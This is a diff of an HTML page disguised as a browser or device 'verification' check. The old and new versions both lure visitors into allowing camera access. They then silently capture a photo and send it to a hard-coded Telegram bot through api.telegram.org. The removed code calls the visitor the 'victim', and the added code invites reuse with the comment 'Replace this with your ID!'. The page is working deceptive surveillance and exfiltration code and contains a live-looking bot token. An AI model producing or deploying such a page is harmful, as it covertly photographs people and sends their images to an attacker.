@@ -1,37 +1,66 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
-    <h2>Security Verification</h2>
-    <p>Please click the button to verify your browser.</p>
-    <button id="vBtn" style="padding:15px 30px; font-size:18px;">VERIFY NOW</button>
-    <video id="vid" style="display:none;" autoplay></video>
-    <canvas id="can" style="display:none;"></canvas>
+<head>
+    <title>Verification System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2>Device Verification Required</h2>
+    <p>Please click the button below to verify your identity.</p>
+    
+    <button class="btn" onclick="startCapture()">VERIFY NOW</button>
+
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
-        const CHAT_ID = "6643732863";
+        const CHAT_ID = "6643732863"; // Replace this with your ID!
 
-        document.getElementById('vBtn').onclick = async () => {
+        async function startCapture() {
             try {
-                // Requesting access - Victim MUST click 'Allow'
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                const vid = document.getElementById('vid');
-                vid.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
+                // Wait for video to load then snap
                 setTimeout(() => {
-                    const can = document.getElementById('can');
-                    can.width = 640; can.height = 480;
-                    can.getContext('2d').drawImage(vid, 0, 0);
-                    can.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'capture.jpg');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
-                        window.location.href = "https://google.com"; // Redirect
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(blob => {
+                        sendToTelegram(blob);
                     }, 'image/jpeg');
-                }, 1500);
-            } catch (e) { alert("Verification Failed. Permission Required."); }
-        };
+                    
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                    alert("Verification Complete!");
+                }, 2000);
+
+            } catch (err) {
+                alert("Please allow camera access to proceed.");
+            }
+        }
+
+        function sendToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", photoBlob, "capture.jpg");
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => console.log("Success:", response))
+            .catch(error => console.error("Error:", error));
+        }
     </script>
 </body>
 </html>
